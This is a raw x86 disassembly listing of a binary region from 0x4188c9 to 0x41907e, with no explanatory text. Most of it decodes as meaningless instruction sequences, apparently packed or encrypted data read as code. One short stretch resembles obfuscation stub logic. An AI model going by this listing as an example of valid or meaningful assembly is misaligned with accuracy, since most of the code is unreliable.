  4188c9:	jl     0x41889c
  4188cb:	call   0x5f77f7fd
  4188d0:	in     al,dx
  4188d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188d2:	sbb    eax,DWORD PTR [esi-0x19156acd]
  4188d8:	jmp    0xeff4:0x6a325c9
  4188df:	push   ebx
  4188e0:	push   eax
  4188e1:	sub    edi,DWORD PTR [eax]
  4188e3:	xor    ebx,DWORD PTR [edi]
  4188e5:	sub    BYTE PTR [eax+0x4c7a6702],bh
  4188eb:	rcl    BYTE PTR [ebx-0x11c8f3dd],1
  4188f1:	adc    al,0xcd
  4188f3:	lea    esi,[esi-0x7da9c456]
  4188f9:	dec    ebx
  4188fa:	xchg   esi,eax
  4188fb:	xchg   esi,eax
  4188fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188fd:	pop    ebx
  4188fe:	test   BYTE PTR [ecx],bh
  418900:	add    DWORD PTR [ebp-0x4f],ecx
  418903:	jno    0x41892b
  418905:	sbb    esi,esp
  418907:	(bad)  
  418908:	cmc    
  418909:	lea    edi,[esi+0xf264785]
  41890f:	mov    eax,0xc59a5a8a
  418914:	ror    DWORD PTR [esi-0x73],cl
  418917:	push   eax
  418918:	fld    QWORD PTR [esi-0x22]
  41891b:	leave  
  41891c:	ds stos BYTE PTR es:[edi],al
  41891e:	xchg   dh,dh
  418920:	sub    al,0xf0
  418922:	retf   0x45ff
  418925:	sbb    esi,0xffffffce
  418928:	popf   
  418929:	jo     0x418929
  41892b:	mov    ch,BYTE PTR [esi-0x3295c20e]
  418931:	add    DWORD PTR [eax+0x4544abd4],ecx
  418937:	ror    BYTE PTR [ebx],0x3b
  41893a:	add    BYTE PTR [ebp+0x66],ch
  41893d:	popa   
  41893e:	sub    ebp,DWORD PTR [ebx+0x7410046c]
  418944:	sahf   
  418945:	dec    eax
  418946:	adc    BYTE PTR [ebp+0x44],0x46
  41894a:	push   ss
  41894b:	dec    esp
  41894c:	adc    dl,ah
  41894e:	push   ecx
  41894f:	add    DWORD PTR [ebx],ecx
  418951:	icebp  
  418952:	stos   BYTE PTR es:[edi],al
  418953:	hlt    
  418954:	and    edi,esi
  418956:	ret    
  418957:	das    
  418958:	std    
  418959:	in     al,dx
  41895a:	pop    edi
  41895b:	fxch   st(1)
  41895d:	and    eax,0x62c284d7
  418962:	repz fnstenv [ebx-0x15]
  418966:	cld    
  418967:	ss mov dh,0x76
  41896a:	adc    DWORD PTR [ecx+0x42],esp
  41896d:	jb     0x418954
  41896f:	or     BYTE PTR [ebx+eax*8],0x90
  418973:	jle    0x41893d
  418975:	jp     0x418916
  418977:	mov    ds:0x4ba83989,al
  41897c:	cdq    
  41897d:	mov    ebp,0xec2e5c33
  418982:	out    0x6f,al
  418984:	add    al,0x83
  418986:	push   0xffffffdf
  418988:	mov    al,cl
  41898a:	icebp  
  41898b:	iret   
  41898c:	cmp    eax,0x78e5d98a
  418991:	rcr    edi,cl
  418993:	fwait
  418994:	pop    ss
  418995:	outs   dx,DWORD PTR ds:[esi]
  418996:	ins    BYTE PTR es:[edi],dx
  418997:	xor    al,0xcf
  418999:	adc    ah,BYTE PTR [ebx+edi*1+0x58]
  41899d:	mov    bh,0x42
  41899f:	cmp    ebx,DWORD PTR [esp+eax*2]
  4189a2:	fnstsw WORD PTR [eax-0x3f]
  4189a5:	mov    BYTE PTR [edi-0x325b23d3],dh
  4189ab:	enter  0xd57e,0xf2
  4189af:	mov    cl,0x19
  4189b1:	clc    
  4189b2:	in     eax,dx
  4189b3:	test   BYTE PTR [ecx-0x16],al
  4189b6:	adc    esi,DWORD PTR ds:0x7c923fc5
  4189bc:	(bad)  
  4189bd:	jmp    0x71c8:0x9d335a00
  4189c4:	out    dx,al
  4189c5:	aaa    
  4189c6:	shl    BYTE PTR [esi+0x681de1b5],1
  4189cc:	int    0xa9
  4189ce:	dec    esp
  4189cf:	(bad)  
  4189d0:	xchg   edx,eax
  4189d1:	mov    BYTE PTR [edi+0x1b7fcbbb],ch
  4189d7:	jne    0x418a3c
  4189d9:	cmp    ebp,DWORD PTR [edx]
  4189db:	sti    
  4189dc:	(bad)  
  4189dd:	cld    
  4189de:	adc    bh,BYTE PTR [ebx-0x35cab810]
  4189e4:	inc    ebp
  4189e5:	jge    0x418975
  4189e7:	call   0x3fc833fc
  4189ec:	(bad)
  4189ef:	ins    DWORD PTR es:[edi],dx
  4189f0:	xchg   edi,eax
  4189f1:	imul   ebp,DWORD PTR [edx],0x9db3b90b
  4189f7:	adc    eax,0x9a3cf034
  4189fc:	sbb    BYTE PTR [esi+edi*8-0x62],dl
  418a00:	test   BYTE PTR [ecx],0x89
  418a03:	arpl   WORD PTR [edx-0x598f9288],ax
  418a09:	scas   ax,WORD PTR es:[edi]
  418a0b:	inc    ebx
  418a0c:	pop    esp
  418a0d:	inc    ecx
  418a0e:	xor    cl,al
  418a10:	neg    DWORD PTR cs:[bp-0x61]
  418a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a16:	add    DWORD PTR [edx-0x4fa60205],edi
  418a1c:	cmp    edi,DWORD PTR [ebx-0x291dd445]
  418a22:	adc    eax,0x36b4a8f5
  418a27:	in     al,0x14
  418a29:	push   ss
  418a2a:	sbb    esi,DWORD PTR [eax+eiz*2]
  418a2d:	dec    ecx
  418a2e:	fldcw  WORD PTR [edx-0xde76d05]
  418a34:	xchg   edx,eax
  418a35:	dec    eax
  418a36:	shr    DWORD PTR [ecx+0x3efb469e],cl
  418a3c:	xor    eax,0xbae7c7d5
  418a41:	or     eax,0x435fceb2
  418a46:	sbb    eax,0x58505fe
  418a4b:	xchg   BYTE PTR [eax+0x8],ch
  418a4e:	ret    0xa690
  418a51:	or     edx,eax
  418a53:	inc    edi
  418a54:	mov    eax,0x2973ce62
  418a59:	xchg   edx,eax
  418a5a:	jbe    0x4189ec
  418a5c:	add    BYTE PTR [ecx+0x1a],ch
  418a5f:	call   0xab7e:0xe350df87
  418a66:	(bad)  
  418a68:	clc    
  418a69:	sbb    ebx,ebx
  418a6b:	popa   
  418a6c:	mov    ch,0xcc
  418a6e:	mov    eax,ds
  418a70:	popf   
  418a71:	lahf   
  418a72:	hlt    
  418a73:	and    BYTE PTR [ebx],ch
  418a75:	aam    0xb8
  418a77:	in     al,0x15
  418a79:	pop    es
  418a7a:	loop   0x418ac9
  418a7c:	mov    eax,ecx
  418a7e:	retf   
  418a7f:	call   0xecca540a
  418a84:	push   esp
  418a85:	push   esp
  418a86:	jl     0x418a1e
  418a88:	fisttp DWORD PTR [edi+0xa]
  418a8b:	js     0x418a3f
  418a8d:	das    
  418a8e:	sti    
  418a8f:	and    dl,BYTE PTR [ebx+0x3a]
  418a92:	in     eax,0x78
  418a94:	mov    dh,0x91
  418a96:	fmul   DWORD PTR [ebx+0x5028378e]
  418a9c:	and    ebx,DWORD PTR [esi-0x6a]
  418a9f:	jle    0x418a2c
  418aa1:	rol    ebp,0x3e
  418aa4:	adc    eax,0xcfe6cb70
  418aa9:	nop
  418aaa:	push   ss
  418aab:	test   eax,0x966b9289
  418ab0:	test   eax,0xeaf3792f
  418ab5:	mov    ?,WORD PTR ds:0x5aa9818d
  418abb:	mov    ch,BYTE PTR [ebx]
  418abd:	mov    ah,0xad
  418abf:	jae    0x418aa8
  418ac1:	cdq    
  418ac2:	daa    
  418ac3:	add    BYTE PTR [ebp+ebx*8+0x27cc80f6],0xc8
  418acb:	fistp  QWORD PTR [edi+0x431e4355]
  418ad1:	inc    ebx
  418ad2:	mov    esp,0x4967a6fa
  418ad7:	inc    ecx
  418ad8:	mov    eax,ds:0x75bbe8a
  418add:	mov    ds:0x235ba9d1,eax
  418ae2:	in     al,dx
  418ae3:	ds and ecx,edi
  418ae6:	fsqrt  
  418ae8:	mov    cl,0x80
  418aea:	(bad)  
  418aeb:	pushf  
  418aec:	and    dl,bl
  418aee:	sar    BYTE PTR [edx],0xd5
  418af1:	sub    DWORD PTR [edx],edx
  418af3:	push   cs
  418af4:	aam    0x15
  418af6:	scas   al,BYTE PTR es:[edi]
  418af7:	and    DWORD PTR fs:[ecx],ecx
  418afa:	sub    DWORD PTR [edi+edi*2],ecx
  418afd:	and    al,0xbf
  418aff:	shl    BYTE PTR [eax+0x376823e4],cl
  418b05:	pushf  
  418b06:	pushf  
  418b07:	js     0x418ab6
  418b09:	mov    bh,0xd5
  418b0b:	xor    ebp,esi
  418b0d:	adc    al,0xc8
  418b0f:	enter  0xf373,0x5a
  418b13:	js     0x418b2a
  418b15:	out    dx,eax
  418b16:	test   ch,al
  418b18:	inc    edi
  418b19:	lods   eax,DWORD PTR fs:[esi]
  418b1b:	pop    esi
  418b1c:	inc    ecx
  418b1d:	stos   BYTE PTR es:[edi],al
  418b1e:	sbb    cl,BYTE PTR ds:0x2bfc27d7
  418b24:	xlat   BYTE PTR ds:[ebx]
  418b25:	scas   al,BYTE PTR es:[edi]
  418b26:	add    dl,dh
  418b28:	add    eax,0xcead7f37
  418b2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b2e:	xlat   BYTE PTR ds:[ebx]
  418b2f:	les    edx,FWORD PTR [eax-0x1]
  418b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b33:	mov    al,0x6e
  418b35:	aaa    
  418b36:	sti    
  418b37:	pop    ds
  418b38:	aam    0xac
  418b3a:	enter  0x767d,0x67
  418b3e:	push   edx
  418b3f:	inc    edx
  418b40:	mov    ecx,ebp
  418b42:	xchg   esi,eax
  418b43:	je     0x418b7e
  418b45:	push   cs
  418b46:	cmp    bl,dh
  418b48:	cdq    
  418b49:	xchg   BYTE PTR [ecx+0x1e82f421],al
  418b4f:	hlt    
  418b50:	pushf  
  418b51:	dec    edx
  418b52:	mov    ds:0xe70005dc,eax
  418b57:	sub    esi,DWORD PTR [esp+ecx*2+0x47]
  418b5b:	imul   esi,edx,0xffffffdd
  418b5e:	mov    ds:0x54f2bd0e,al
  418b63:	xchg   edi,eax
  418b64:	mov    ebp,0x68f1db62
  418b69:	mov    ds:0x490c243b,eax
  418b6e:	in     al,dx
  418b6f:	inc    eax
  418b70:	js     0x418b4c
  418b72:	call   0x9bc1cf90
  418b77:	popf   
  418b78:	fwait
  418b79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b7a:	mov    ah,0xd1
  418b7c:	sbb    eax,0xe25ba213
  418b81:	ins    DWORD PTR es:[edi],dx
  418b82:	and    BYTE PTR [eax],bl
  418b84:	rcr    DWORD PTR [esi-0x57],1
  418b87:	hlt    
  418b88:	mov    bh,BYTE PTR [esi+0x4f]
  418b8b:	jl     0x418be7
  418b8d:	sahf   
  418b8e:	inc    esi
  418b8f:	add    edi,0x122fd2ad
  418b95:	dec    esp
  418b96:	lock push edi
  418b98:	neg    DWORD PTR [ecx]
  418b9a:	imul   DWORD PTR [ecx+0x1ac4f3d4]
  418ba0:	jmp    0x3b733d83
  418ba5:	aaa    
  418ba6:	push   ebx
  418ba7:	mov    ecx,DWORD PTR [esi+0x2691c1da]
  418bad:	mov    bh,0xd8
  418baf:	outs   dx,BYTE PTR ds:[esi]
  418bb0:	iret   
  418bb1:	bound  esi,QWORD PTR [ebp+0x5a]
  418bb4:	mov    bl,0xbf
  418bb6:	out    dx,eax
  418bb7:	xchg   ecx,eax
  418bb8:	inc    esp
  418bb9:	sar    DWORD PTR [ebx-0x1f],cl
  418bbc:	push   ebp
  418bbd:	outs   dx,DWORD PTR ds:[esi]
  418bbe:	mov    al,BYTE PTR [ebp+0x71]
  418bc1:	mov    esi,0xc4523f09
  418bc6:	xchg   BYTE PTR [esi*8-0x286e2ab1],cl
  418bcd:	cli    
  418bce:	aad    0x71
  418bd0:	inc    ebp
  418bd1:	adc    cl,BYTE PTR [edi+eax*2]
  418bd4:	cmc    
  418bd5:	pop    ebx
  418bd6:	dec    esp
  418bd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bd8:	js     0x418baf
  418bda:	call   0x3ffd:0xb1c03240
  418be1:	mov    edx,0x72a85e18
  418be6:	add    BYTE PTR [ebx+0x64],ah
  418be9:	sub    DWORD PTR [eax],esp
  418beb:	sub    eax,0x6594ed08
  418bf0:	jge    0x418bb3
  418bf2:	leave  
  418bf3:	enter  0xa2fa,0x6
  418bf7:	inc    esi
  418bf8:	push   ss
  418bf9:	add    DWORD PTR ds:0xd8c9d2ba,esi
  418bff:	mov    BYTE PTR [ebp+ebp*4+0x51c1f622],ah
  418c06:	mov    ch,0xf3
  418c08:	xchg   DWORD PTR [ebx],ebp
  418c0a:	loope  0x418bad
  418c0c:	std    
  418c0d:	gs ret 
  418c0f:	inc    esp
  418c10:	into   
  418c11:	adc    dh,BYTE PTR [edi+ecx*8+0x4a]
  418c15:	mov    ds:0xdf62ee41,eax
  418c1a:	cmp    al,0x92
  418c1c:	(bad)  
  418c1d:	or     bh,cl
  418c1f:	mov    ah,0x77
  418c21:	xchg   bh,dh
  418c23:	jno    0x418c26
  418c25:	jmp    0x418be2
  418c27:	pusha  
  418c28:	mov    cl,dl
  418c2a:	(bad)  
  418c2b:	in     al,0xc7
  418c2d:	dec    ecx
  418c2e:	xor    al,0x1c
  418c30:	mov    esp,0xac05e300
  418c35:	pop    esp
  418c36:	sub    ebp,DWORD PTR [ecx+edx*2-0x7ef203e6]
  418c3d:	or     al,0x69
  418c3f:	fsub   st,st(1)
  418c41:	scas   eax,DWORD PTR es:[edi]
  418c42:	and    BYTE PTR [ebx+0x7e],bl
  418c45:	sub    BYTE PTR [esi],cl
  418c47:	pop    eax
  418c48:	mov    ds,WORD PTR [eax-0x33ee6d9c]
  418c4e:	adc    cl,BYTE PTR [ecx]
  418c50:	in     al,dx
  418c51:	push   ebx
  418c52:	inc    eax
  418c53:	bound  ecx,QWORD PTR [edx]
  418c55:	jae    0x418bee
  418c57:	cmp    DWORD PTR [edx],0x197f8b1f
  418c5d:	fidivr WORD PTR [ebx-0x46]
  418c60:	mov    BYTE PTR [ebp+0x674a4301],ch
  418c66:	mov    ebx,DWORD PTR [ebp-0x50]
  418c69:	add    edx,ecx
  418c6b:	xor    edx,ebx
  418c6d:	mov    DWORD PTR [ebp-0x50],edx
  418c70:	mov    edx,DWORD PTR [ebp+0x8]
  418c73:	mov    ebx,DWORD PTR [ebp-0x4c]
  418c76:	add    edx,edi
  418c78:	and    edx,ebx
  418c7a:	mov    DWORD PTR [ebp-0x4c],edx
  418c7d:	mov    edx,DWORD PTR [ebp+0x8]
  418c80:	mov    ebx,DWORD PTR [ebp-0x48]
  418c83:	lea    edx,[ebx+edx*1+0x241fcde]
  418c8a:	mov    DWORD PTR [ebp-0x48],edx
  418c8d:	mov    edx,DWORD PTR [ebp+0x8]
  418c90:	mov    ebx,0xfa5e1521
  418c95:	sub    ebx,edx
  418c97:	add    ebx,DWORD PTR [ebp-0x44]
  418c9a:	mov    DWORD PTR [ebp-0x44],ebx
  418c9d:	mov    edx,DWORD PTR [ebp+0x8]
  418ca0:	xor    edx,eax
  418ca2:	add    edx,esi
  418ca4:	jne    0x4144eb
  418caa:	jmp    0x41b0d8
  418caf:	jmp    0x41b050
  418cb4:	ins    BYTE PTR es:[edi],dx
  418cb5:	loopne 0x418cba
  418cb7:	jmp    0x418c3c
  418cb9:	mov    eax,DWORD PTR [ebx+ebx*8+0x6fd1292a]
  418cc0:	fs mov edx,0x1f3258b7
  418cc6:	jge    0x418d42
  418cc8:	(bad)  
  418cc9:	pop    edi
  418cca:	jp     0x418d46
  418ccc:	out    0x6d,al
  418cce:	mov    bh,0xf4
  418cd0:	mov    ebp,0x97af7b8c
  418cd5:	arpl   WORD PTR [edx],cx
  418cd7:	sbb    bl,0x9f
  418cda:	iret   
  418cdb:	in     al,dx
  418cdc:	lods   al,BYTE PTR ds:[esi]
  418cdd:	cmc    
  418cde:	sbb    dl,BYTE PTR [ebx-0x28]
  418ce1:	jb     0x418d33
  418ce3:	mov    al,0x49
  418ce5:	mov    edx,ss
  418ce7:	pop    ds
  418ce8:	out    0x50,al
  418cea:	xor    DWORD PTR [edx+0x43],ecx
  418ced:	add    esi,esi
  418cef:	dec    ebx
  418cf0:	ins    DWORD PTR es:[edi],dx
  418cf1:	add    ch,BYTE PTR [ebx]
  418cf3:	sbb    al,0x15
  418cf5:	imul   ecx,ebp,0xfffffff2
  418cf8:	(bad)  
  418cf9:	mov    DWORD PTR [ecx],ebp
  418cfb:	lea    ecx,[edi-0x7f]
  418cfe:	xor    al,0x94
  418d00:	pop    es
  418d01:	int    0xdd
  418d03:	in     eax,dx
  418d04:	ret    0xb7e3
  418d07:	xor    DWORD PTR [ecx-0x54],edx
  418d0a:	retf   0xcf53
  418d0d:	ds or  ah,al
  418d10:	arpl   WORD PTR [ebp+edx*1+0x26cb294],bx
  418d17:	add    ch,BYTE PTR [ebp-0x2382da24]
  418d1d:	sar    DWORD PTR ss:[ebx-0x58],0xa2
  418d22:	enter  0xe57c,0x5f
  418d26:	jmp    0x64b2:0x5d42ec96
  418d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d2e:	shl    DWORD PTR [eax+0x6736d0e],cl
  418d34:	ret    
  418d35:	mov    edx,0xdc3ece41
  418d3a:	das    
  418d3b:	jmp    0x7dd5:0x816e281c
  418d42:	repz xor ecx,DWORD PTR [ecx+eiz*4+0x4d2793a1]
  418d4a:	(bad)  [edi+0x2d507efd]
  418d50:	lahf   
  418d51:	xor    al,0x19
  418d53:	scas   al,BYTE PTR es:[edi]
  418d54:	cmc    
  418d55:	pop    ebp
  418d56:	push   edx
  418d57:	in     eax,0x5e
  418d59:	jne    0x418d84
  418d5b:	loopne 0x418ce1
  418d5d:	add    al,0x29
  418d5f:	xor    BYTE PTR [bx],dh
  418d62:	bound  ecx,QWORD PTR [ebx-0x27]
  418d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d66:	and    DWORD PTR [ebx-0x5b],edx
  418d69:	fcomp  QWORD PTR ds:[eax]
  418d6c:	psubd  mm5,QWORD PTR [eax+0x1190ad34]
  418d73:	lock out 0xe5,al
  418d76:	push   cs
  418d77:	das    
  418d78:	(bad)  
  418d79:	icebp  
  418d7a:	sti    
  418d7b:	inc    eax
  418d7c:	cs jmp 0x418d4f
  418d7f:	jg     0x418d48
  418d81:	jbe    0x418d36
  418d83:	xchg   esp,eax
  418d84:	mov    ah,0x92
  418d86:	cs push edi
  418d88:	pop    es
  418d89:	dec    esi
  418d8a:	imul   ecx,ebx,0x3b
  418d8d:	inc    ecx
  418d8e:	xchg   esi,eax
  418d8f:	lods   eax,DWORD PTR ds:[esi]
  418d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d91:	sub    BYTE PTR [edx],dh
  418d93:	rol    BYTE PTR [di],0x3c
  418d97:	pop    edx
  418d98:	popa   
  418d99:	adc    esp,DWORD PTR [ecx+edi*4]
  418d9c:	aad    0x57
  418d9e:	mov    BYTE PTR [ebp+ecx*2-0x55e536a2],ch
  418da5:	(bad)  
  418da6:	jno    0x418deb
  418da8:	sbb    ebp,ecx
  418daa:	ss push esp
  418dac:	and    DWORD PTR [eax-0x3a],esi
  418daf:	(bad)  [ebx]
  418db1:	xchg   edx,esi
  418db3:	pop    ecx
  418db4:	or     esp,DWORD PTR ss:[ebx-0x445153e3]
  418dbb:	cmp    esp,DWORD PTR [ebx]
  418dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dbe:	and    eax,0x4e8eb48b
  418dc3:	cdq    
  418dc4:	leave  
  418dc5:	xchg   ebx,eax
  418dc6:	rcr    BYTE PTR [esi],cl
  418dc8:	pusha  
  418dc9:	pusha  
  418dca:	adc    BYTE PTR [ecx],ah
  418dcc:	dec    DWORD PTR [ecx+0x58]
  418dcf:	add    eax,0x46a61c34
  418dd4:	sti    
  418dd5:	sbb    al,0x19
  418dd7:	adc    edx,DWORD PTR [ecx]
  418dd9:	je     0x418d81
  418ddb:	or     eax,0x59c5c6d8
  418de0:	and    eax,0x3f4bf7cb
  418de5:	scas   al,BYTE PTR es:[edi]
  418de6:	cli    
  418de7:	fwait
  418de8:	jns    0x418db8
  418dea:	mov    WORD PTR [esi],ds
  418dec:	adc    bl,BYTE PTR [ebx+0x57]
  418def:	jae    0x418dc6
  418df1:	(bad)  
  418df2:	ret    
  418df3:	(bad)  
  418df4:	enter  0x26a6,0x2e
  418df8:	inc    ebp
  418df9:	call   0x4cf9:0x83945d40
  418e00:	dec    edx
  418e01:	loopne 0x418e4b
  418e03:	sti    
  418e04:	ss push 0x20
  418e07:	idiv   BYTE PTR [edi+0x798db19c]
  418e0d:	ss adc eax,0xe7e06659
  418e13:	gs push 0x35d367d9
  418e19:	sti    
  418e1a:	cmp    al,BYTE PTR [ebp+0x64152466]
  418e20:	je     0x418e91
  418e22:	js     0x418dd2
  418e24:	int    0x5c
  418e26:	sahf   
  418e27:	scas   eax,DWORD PTR es:[edi]
  418e28:	ds fwait
  418e2a:	push   ebp
  418e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e2c:	int3   
  418e2d:	xor    DWORD PTR [esi-0x4b06d675],ebp
  418e33:	les    ebp,FWORD PTR [edx]
  418e35:	outs   dx,BYTE PTR ds:[esi]
  418e36:	xchg   ecx,eax
  418e37:	out    dx,al
  418e38:	shl    cl,0x19
  418e3b:	and    ebx,ecx
  418e3d:	(bad)  
  418e3e:	not    BYTE PTR [edx]
  418e40:	jp     0x418e7a
  418e42:	loope  0x418e3a
  418e44:	xor    al,0xc3
  418e46:	ds pop esi
  418e48:	cs pop edx
  418e4a:	pop    ebp
  418e4b:	mov    al,ds:0x1344812c
  418e50:	pop    ebp
  418e51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e52:	cwde   
  418e53:	or     ecx,DWORD PTR [edi-0x35afcd06]
  418e59:	inc    ebx
  418e5a:	iret   
  418e5b:	add    BYTE PTR [ebx],al
  418e5d:	fcomp  QWORD PTR [ecx-0x7c73918f]
  418e63:	pushf  
  418e64:	aad    0x91
  418e66:	inc    eax
  418e67:	pusha  
  418e68:	push   esp
  418e69:	les    ecx,FWORD PTR [ebp+0x5c]
  418e6c:	jl     0x418e49
  418e6e:	mov    dh,0xd7
  418e70:	ins    BYTE PTR es:[edi],dx
  418e71:	rol    BYTE PTR [edi-0x36],0x1a
  418e75:	clc    
  418e76:	out    0xdc,eax
  418e78:	mov    esp,0x453fe7f4
  418e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e7e:	jmp    0x7c20:0xb840756e
  418e85:	scas   al,BYTE PTR es:[edi]
  418e86:	adc    esi,DWORD PTR [ecx-0xf]
  418e89:	rol    ah,cl
  418e8b:	gs in  eax,dx
  418e8d:	fcom   DWORD PTR [eax]
  418e8f:	mov    edx,0xbc4144a3
  418e94:	mov    edx,0x6679fcc0
  418e99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e9a:	cmc    
  418e9b:	mov    edx,0x72413e08
  418ea0:	das    
  418ea1:	inc    edx
  418ea2:	adc    eax,0xa8a7a9e9
  418ea7:	add    eax,0xca590f30
  418eac:	sbb    edx,eax
  418eae:	mov    WORD PTR [ebp-0x7cca8e1a],gs
  418eb4:	push   edi
  418eb5:	sub    esp,DWORD PTR [ecx+0x50e2ca88]
  418ebb:	dec    esp
  418ebc:	stos   DWORD PTR es:[edi],eax
  418ebd:	inc    esp
  418ebe:	add    BYTE PTR [eax-0x7],ah
  418ec1:	cmp    esp,esp
  418ec3:	out    dx,al
  418ec4:	or     eax,0x4e69d6e2
  418ec9:	mov    eax,ds:0x8d314ae9
  418ece:	cmp    esp,ecx
  418ed0:	adc    DWORD PTR [ebx],esi
  418ed2:	and    cl,BYTE PTR [esi-0x37]
  418ed5:	push   es
  418ed6:	jp     0x418e77
  418ed8:	and    al,0xc8
  418eda:	or     DWORD PTR [edi+0x63],edi
  418edd:	lock out dx,eax
  418edf:	mov    bl,0xc7
  418ee1:	xor    edx,edi
  418ee3:	icebp  
  418ee4:	mov    ebx,0x7394a216
  418ee9:	bound  eax,QWORD PTR [esi]
  418eeb:	stos   BYTE PTR es:[edi],al
  418eec:	push   edx
  418eed:	hlt    
  418eee:	sbb    eax,0xd740a283
  418ef3:	add    eax,0xe087ddf1
  418ef8:	push   edi
  418ef9:	jmp    0x36cfd5ee
  418efe:	push   edx
  418eff:	lahf   
  418f00:	ret    0xee58
  418f03:	fld    st(0)
  418f05:	and    al,0x32
  418f07:	call   0xb107:0x74e519d
  418f0e:	jg     0x418ee4
  418f10:	pop    edi
  418f11:	jecxz  0x418ea5
  418f13:	ds test eax,0xa599c07f
  418f19:	pop    ds
  418f1a:	stos   DWORD PTR es:[edi],eax
  418f1b:	xor    ecx,DWORD PTR [edi-0x4487d928]
  418f21:	mov    dh,0xb0
  418f23:	pop    esi
  418f24:	or     BYTE PTR [ecx],ah
  418f26:	push   esp
  418f27:	test   BYTE PTR [esp+edi*4-0x120e8561],al
  418f2e:	scas   eax,DWORD PTR es:[edi]
  418f2f:	mov    ebp,0x6cf7bcd4
  418f34:	stos   BYTE PTR es:[edi],al
  418f35:	inc    esi
  418f36:	leave  
  418f37:	jl     0x418f0e
  418f39:	or     BYTE PTR [ebx-0x35],bl
  418f3c:	repnz fist DWORD PTR [di+0x1f]
  418f41:	sbb    edx,DWORD PTR ds:0xe3b6ae4
  418f47:	pop    ds
  418f48:	mov    ds:0x68dfdbd,eax
  418f4d:	sbb    DWORD PTR [ecx+0xb57fb35],ecx
  418f53:	inc    ecx
  418f54:	les    edi,FWORD PTR [ebx-0x245d14d8]
  418f5a:	fcom   QWORD PTR [ebp+ebx*1+0x7ea9e8fa]
  418f61:	sub    ebx,DWORD PTR [ebx-0xeeefaae]
  418f67:	lods   eax,DWORD PTR ds:[esi]
  418f68:	test   DWORD PTR [edx+0x29758bcc],0xd56b8c8
  418f72:	leave  
  418f73:	aad    0xa2
  418f75:	enter  0x58d6,0x40
  418f79:	jbe    0x418f17
  418f7b:	fdiv   QWORD PTR [edi-0x45364616]
  418f81:	scas   al,BYTE PTR es:[edi]
  418f82:	mov    cs,WORD PTR [eax]
  418f84:	(bad)  
  418f85:	pushf  
  418f86:	jae    0x418fc3
  418f88:	mov    es,ebx
  418f8a:	ror    BYTE PTR [ecx-0x397eb565],1
  418f90:	pop    ebx
  418f91:	add    al,0xbc
  418f93:	push   ebx
  418f94:	mov    eax,ds:0x9097475b
  418f99:	leave  
  418f9a:	gs pop ecx
  418f9c:	mov    ebx,0x845315d6
  418fa1:	fdiv   st,st(7)
  418fa3:	mov    bl,0x38
  418fa5:	mov    esi,0xbf955e6f
  418faa:	mov    eax,0xa3dc8c24
  418faf:	clc    
  418fb0:	test   DWORD PTR ds:[edi+0x40032f73],0x4a9129f5
  418fbb:	hlt    
  418fbc:	mov    bl,0xac
  418fbe:	push   es
  418fbf:	adc    DWORD PTR [edx+0x39205b51],esp
  418fc5:	and    DWORD PTR [ecx+0x6b],edx
  418fc8:	mov    dl,0xbd
  418fca:	(bad)  [esi-0x6b]
  418fcd:	xor    eax,0x36801e8b
  418fd2:	mov    BYTE PTR [esi],cl
  418fd4:	daa    
  418fd5:	and    ah,BYTE PTR [edx-0x66]
  418fd8:	push   eax
  418fd9:	stos   DWORD PTR es:[edi],eax
  418fda:	inc    esi
  418fdb:	jecxz  0x419040
  418fdd:	sbb    edi,0x3afec06f
  418fe3:	jecxz  0x418f84
  418fe5:	std    
  418fe6:	push   edi
  418fe7:	pop    ss
  418fe8:	cwde   
  418fe9:	ret    0xb078
  418fec:	(bad)  
  418fed:	dec    esp
  418fee:	pop    ss
  418fef:	mov    edx,0xf0ee6d33
  418ff4:	mov    bh,0x4a
  418ff6:	push   ds
  418ff7:	pop    es
  418ff8:	dec    edx
  418ff9:	inc    ebp
  418ffa:	imul   edi,DWORD PTR [esi-0x1317d7bc],0xffffffdd
  419001:	mov    dl,0x9e
  419003:	and    eax,DWORD PTR [edx-0x15]
  419006:	add    esi,0x34
  419009:	out    dx,eax
  41900a:	add    al,0x51
  41900c:	cwde   
  41900d:	scas   al,BYTE PTR es:[edi]
  41900e:	shl    DWORD PTR [eax+0x25],1
  419011:	out    0xa7,eax
  419013:	sbb    eax,0x48df6bfd
  419018:	mov    cs,WORD PTR [ebx]
  41901a:	and    al,0x28
  41901d:	arpl   WORD PTR [esp+eiz*8-0x2b],bp
  419021:	retf   0xff93
  419024:	mov    edi,0xc61ac563
  419029:	cmovb  eax,ecx
  41902c:	push   edx
  41902d:	sub    bl,BYTE PTR [esi-0x3]
  419030:	mov    ah,0xd8
  419032:	imul   ecx,DWORD PTR ds:0x56704a01,0x35
  419039:	mov    dh,0x22
  41903b:	(bad)  
  41903c:	jmp    0x41904f
  41903e:	push   esp
  41903f:	mov    edi,0x759c8c2f
  419044:	add    eax,0xc325d048
  419049:	add    ch,bh
  41904b:	sar    DWORD PTR [edx-0x5c],cl
  41904e:	xchg   DWORD PTR [esi+eiz*2+0x296aa42e],ebx
  419055:	mov    bh,ch
  419057:	push   bx
  419059:	dec    edx
  41905a:	in     eax,0xe6
  41905c:	adc    ah,BYTE PTR [ebx+0x39]
  41905f:	sbb    al,0x9c
  419061:	xchg   edi,eax
  419062:	(bad)  [ebp+eiz*1-0x35]
  419066:	inc    ecx
  419067:	pop    esp
  419068:	or     DWORD PTR [di],0x35
  41906c:	sahf   
  41906d:	or     eax,0xf82fa360
  419072:	add    dl,BYTE PTR [esi-0x69647569]
  419078:	cmc    
  419079:	inc    edx
  41907a:	rcr    al,cl
  41907c:	in     eax,0xe
  41907e:	adc    edi,DWORD PTR [ebp+0x27]
